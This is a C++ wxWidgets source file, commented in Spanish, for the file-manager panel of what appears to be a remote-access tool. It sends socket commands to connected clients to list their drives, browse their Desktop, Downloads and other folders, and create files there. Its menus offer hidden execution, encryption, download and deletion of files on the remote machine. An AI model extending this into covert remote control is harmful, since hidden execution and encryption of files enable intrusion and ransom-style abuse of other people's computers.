#include "panel_file_manager.hpp"
#include "frame_client.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(panelFileManager, wxPanel)
	EVT_MENU(wxID_ANY, panelFileManager::OnToolBarClick)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(ListCtrlManager, wxListCtrl)
	EVT_MENU(EnumMenuFM::ID_New_Folder, ListCtrlManager::OnCrearFolder)
	EVT_MENU(EnumMenuFM::ID_New_Archivo, ListCtrlManager::OnCrearArchivo)
    EVT_CONTEXT_MENU(ListCtrlManager::OnContextMenu)
	EVT_LIST_ITEM_ACTIVATED(EnumIDS::ID_Panel_FM_List, ListCtrlManager::OnActivated)
wxEND_EVENT_TABLE()

panelFileManager::panelFileManager(wxWindow* pParent) :
	wxPanel(pParent, EnumIDS::ID_Panel_FM) {
	this->SetBackgroundColour(wxColor(200, 200, 200));
	
	wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
	if (wxTree) {
		wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
		if (panel_cliente) {
			FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
			if (frame_cliente) {
				this->strID = frame_cliente->strClienteID;
			}
		}
	}

	this->p_ToolBar = new wxToolBar(this, wxID_ANY, wxDefaultPosition, wxDefaultSize, wxTB_VERTICAL | wxTB_LEFT);
	wxImage::AddHandler(new wxPNGHandler);

	wxBitmap pcBitmap(wxT(".\\imgs\\computer.png"), wxBITMAP_TYPE_PNG);
	wxBitmap desktopBitmap(wxT(".\\imgs\\desktop.png"), wxBITMAP_TYPE_PNG);
	wxBitmap downloadBitmap(wxT(".\\imgs\\download.png"), wxBITMAP_TYPE_PNG);
	wxBitmap refreshBitmap(wxT(".\\imgs\\refresh.png"), wxBITMAP_TYPE_PNG);
	//wxBitmap uploadBitmap(wxT(".\\imgs\\upload.png"), wxBITMAP_TYPE_PNG);


	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Equipo, wxT("Equipo"), pcBitmap, "Equipo");
	this->p_ToolBar->AddSeparator(); // Separador entre grupos de botones
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Escritorio, wxT("Escritorio"), desktopBitmap, "Escritorio");
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Descargas, wxT("Descargas"), downloadBitmap, "Descargas");
	this->p_ToolBar->AddSeparator(); 
	this->p_ToolBar->AddSeparator(); 
	this->p_ToolBar->AddSeparator();
	this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Refresh, wxT("Refrescar"), refreshBitmap, wxT("Refrescar"));
	//this->p_ToolBar->AddTool(EnumIDS::ID_Panel_FM_Subir, wxT("Subir"), uploadBitmap, "Subir archivo a ruta actual");
	this->p_ToolBar->Realize();

	this->CrearLista();

	this->p_RutaActual = new wxStaticText(this, EnumIDS::ID_Panel_FM_LblRuta, wxT("\\"), wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 10));

	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
	sizer->Add(this->p_ToolBar, 0, wxEXPAND);
	
	wxBoxSizer* sizer2 = new wxBoxSizer(wxVERTICAL);
	sizer2->Add(this->listManager, 0, wxEXPAND, 1);
	sizer2->Add(this->p_RutaActual, 1, wxEXPAND, 1);

	sizer->Add(sizer2);
	//sizer->Add(new wxStaticText(this, wxID_ANY, "Testing"), 0, wxEXPAND);
	SetSizer(sizer);

}

void panelFileManager::OnToolBarClick(wxCommandEvent& event) {
	wxListItem itemCol;
	std::string strComando = "";
	switch (event.GetId()) {
		case EnumIDS::ID_Panel_FM_Equipo:
			this->listManager->ClearAll();
			
			itemCol.SetText("-");
			itemCol.SetWidth(20);
			itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
			this->listManager->InsertColumn(0, itemCol);

			itemCol.SetText("Nombre");
			itemCol.SetAlign(wxLIST_FORMAT_LEFT);
			itemCol.SetWidth(150);
			this->listManager->InsertColumn(1, itemCol);

			itemCol.SetText("Tipo");
			itemCol.SetWidth(100);
			this->listManager->InsertColumn(2, itemCol);

			itemCol.SetText("Libre");
			itemCol.SetWidth(50);
			this->listManager->InsertColumn(3, itemCol);

			itemCol.SetText("Total");
			itemCol.SetWidth(50);
			this->listManager->InsertColumn(4, itemCol);

			//ENVIAR COMANDO OBTENER DRIVES
			this->iMODE = FM_EQUIPO;
			strComando = std::to_string(EnumComandos::FM_Discos);
			strComando.append(1, '~');
			this->EnviarComando(strComando);
			break;
		case EnumIDS::ID_Panel_FM_Descargas:
			this->listManager->ClearAll();
			itemCol.SetText("-");
			itemCol.SetWidth(20);
			itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
			this->listManager->InsertColumn(0, itemCol);

			itemCol.SetText("Nombre");
			itemCol.SetWidth(150);
			itemCol.SetAlign(wxLIST_FORMAT_LEFT);
			this->listManager->InsertColumn(1, itemCol);

			itemCol.SetText("Tamaño");
			itemCol.SetWidth(80);
			this->listManager->InsertColumn(2, itemCol);

			itemCol.SetText("Fecha Mod");
			itemCol.SetWidth(100);
			this->listManager->InsertColumn(3, itemCol);
			//ENVIAR COMANDO OBTENER FOLDER DESCARGAS
			this->iMODE = FM_NORMAL;

			strComando = std::to_string(EnumComandos::FM_Dir_Folder);
			strComando += "~DESCAR-DOWN";
			this->EnviarComando(strComando);
			break;
		case EnumIDS::ID_Panel_FM_Escritorio:
			this->listManager->ClearAll();
			itemCol.SetText("-");
			itemCol.SetWidth(20);
			itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
			this->listManager->InsertColumn(0, itemCol);

			itemCol.SetText("Nombre");
			itemCol.SetWidth(150);
			itemCol.SetAlign(wxLIST_FORMAT_LEFT);
			this->listManager->InsertColumn(1, itemCol);

			itemCol.SetText("Tamaño");
			itemCol.SetWidth(80);
			this->listManager->InsertColumn(2, itemCol);

			itemCol.SetText("Fecha Mod");
			itemCol.SetWidth(100);
			this->listManager->InsertColumn(3, itemCol);
			//ENVIAR COMANDO OBTENER FOLDER DE ESCRITORIO

			this->iMODE = FM_NORMAL;

			strComando = std::to_string(EnumComandos::FM_Dir_Folder);
			strComando += "~ESCRI-DESK";
			this->EnviarComando(strComando);
			break;
		case EnumIDS::ID_Panel_FM_Refresh:
			this->listManager->DeleteAllItems();
			Sleep(100);
			strComando = std::to_string(EnumComandos::FM_Dir_Folder);
			strComando.append(1, '~');
			strComando += this->p_RutaActual->GetLabelText();
			this->EnviarComando(strComando);
			break;
	}
}

void panelFileManager::CrearLista() {
	this->listManager = new ListCtrlManager(this, EnumIDS::ID_Panel_FM_List, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 400), wxBORDER_THEME | wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES | wxEXPAND);

}

void panelFileManager::EnviarComando(std::string pComando) {
	std::vector<struct Cliente> vc_copy;
	std::unique_lock<std::mutex> lock(vector_mutex);
	vc_copy = p_Servidor->vc_Clientes;
	lock.unlock();

	for (auto vcCli : vc_copy) {
		if (vcCli._id == this->strID) {
			int iEnviado = p_Servidor->cSend(vcCli._sckCliente, pComando.c_str(), pComando.size() + 1, 0, false);
			break;
		}
	}
}

wxString panelFileManager::RutaActual() {
	wxString strOut = "";
	for (auto item : this->c_RutaActual) {
		strOut += item;
	}
	return strOut;
}

//        Acciones menu contextual
//----------------------------------------------
void ListCtrlManager::OnCrearFolder(wxCommandEvent& event) {
	panelFileManager* itemp = (panelFileManager*)this->GetParent();

	wxTextEntryDialog dialog(this, "Nombre", "Crear folder/carpeta", "Nueva Carpeta", wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK){
		std::string strComando = std::to_string(EnumComandos::FM_Crear_Folder);
		strComando.append(1, '~');
		strComando += itemp->p_RutaActual->GetLabelText();
		strComando += dialog.GetValue();
		itemp->EnviarComando(strComando);
	}
}

void ListCtrlManager::OnCrearArchivo(wxCommandEvent& event) {
	panelFileManager* itemp = (panelFileManager*)this->GetParent();

	wxTextEntryDialog dialog(this, "Nombre", "Crear archivo", "LEEME.txt", wxOK | wxCANCEL);
	if (dialog.ShowModal() == wxID_OK) {
		std::string strComando = std::to_string(EnumComandos::FM_Crear_Archivo);
		strComando.append(1, '~');
		strComando += itemp->p_RutaActual->GetLabelText();
		strComando += dialog.GetValue();
		itemp->EnviarComando(strComando);
	}
}
//----------------------------------------------

void ListCtrlManager::OnActivated(wxListEvent& event) {
	panelFileManager* itemp = (panelFileManager*)this->GetParent();
	wxString strPath = "";
	wxString strSelected = "";
	wxListItem itemCol;
	std::string strCommand = "";
	switch (itemp->iMODE) {
		case FM_EQUIPO:
			itemp->c_RutaActual.clear();

			strPath = this->GetItemText(event.GetIndex(), 0) + ":\\";
			itemp->p_RutaActual->SetLabelText(strPath);
			itemp->c_RutaActual.push_back(strPath);
			strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
			strCommand.append(1, '~');
			strCommand += strPath;

			this->ClearAll();
			itemCol.SetText("-");
			itemCol.SetWidth(20);
			itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
			this->InsertColumn(0, itemCol);

			itemCol.SetText("Nombre");
			itemCol.SetWidth(150);
			itemCol.SetAlign(wxLIST_FORMAT_LEFT);
			this->InsertColumn(1, itemCol);

			itemCol.SetText("Tamaño");
			itemCol.SetWidth(80);
			this->InsertColumn(2, itemCol);

			itemCol.SetText("Fecha Mod");
			itemCol.SetWidth(100);
			this->InsertColumn(3, itemCol);

			Sleep(100);

			itemp->EnviarComando(strCommand);
			itemp->iMODE = FM_NORMAL;
			break;
		case FM_NORMAL:
			if (this->GetItemText(event.GetIndex(), 2) == wxString("-")) {
				//Folder
				strSelected = this->GetItemText(event.GetIndex(), 1) + "\\";
				if (strSelected != ".\\") {
					if (strSelected == "..\\") {
						itemp->c_RutaActual.pop_back();
					}
					else {
						itemp->c_RutaActual.push_back(strSelected);
					}

					itemp->p_RutaActual->SetLabelText(itemp->RutaActual());

					this->DeleteAllItems();

					strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
					strCommand.append(1, '~');
					strCommand += itemp->RutaActual();
					itemp->EnviarComando(strCommand);
				}
			}
			break;
		default:
			//
			break;
	}
	//std::cout << this->GetItemText(event.GetIndex(), 1) << std::endl;
}

void ListCtrlManager::ShowContextMenu(const wxPoint& pos, bool isFolder) {
	wxMenu menu;

	if (!isFolder) {
		wxMenu *exec_Menu = new wxMenu;
		exec_Menu->Append(EnumMenuFM::ID_Exec_Visible, "Normal");
		exec_Menu->Append(EnumMenuFM::ID_Exec_Oculto, "Oculto");

		wxMenu* crypt_Menu = new wxMenu;
		crypt_Menu->Append(EnumMenuFM::ID_Crypt, "Encriptar");
		crypt_Menu->Append(EnumMenuFM::ID_Decrypt, "Desencriptar");

		wxMenu* new_menu = new wxMenu;
		new_menu->Append(EnumMenuFM::ID_New_Folder, "Folder/Carpeta");
		new_menu->Append(EnumMenuFM::ID_New_Archivo, "Archivo");

		menu.AppendSubMenu(new_menu, "Nuevo");
		menu.AppendSubMenu(exec_Menu, "Ejecutar");
		menu.Append(EnumMenuFM::ID_Descargar, "Descargar");
		menu.Append(EnumMenuFM::ID_Editar, "Editar");
		menu.AppendSeparator();
		menu.AppendSubMenu(crypt_Menu, "Crypt");
		menu.Append(EnumMenuFM::ID_Eliminar, "Eliminar");

		PopupMenu(&menu, pos.x, pos.y);
	} else {
		//pop menu para folder
		wxMenu* new_menu = new wxMenu;
		new_menu->Append(EnumMenuFM::ID_New_Folder, "Folder/Carpeta");
		new_menu->Append(EnumMenuFM::ID_New_Archivo, "Archivo");

		menu.AppendSubMenu(new_menu, "Nuevo");
		menu.AppendSeparator();
		menu.Append(EnumMenuFM::ID_Eliminar, "Eliminar");

		PopupMenu(&menu, pos.x, pos.y);
	}
}

void ListCtrlManager::OnContextMenu(wxContextMenuEvent& event)
{
	if (GetEditControl() == NULL)
	{
		wxPoint point = event.GetPosition();

		// If from keyboard
		if ((point.x == -1) && (point.y == -1))
		{
			wxSize size = GetSize();
			point.x = size.x / 2;
			point.y = size.y / 2;
		}
		else
		{
			point = ScreenToClient(point);
		}

		int flags;
		long iItem = HitTest(point, flags);

		if (iItem == -1) {
			ShowContextMenu(point, true);
			return;
		}

		ShowContextMenu(point, (this->GetItemText(iItem, 2) == "-") ? true : false);

	}else {
		event.Skip();
	}
}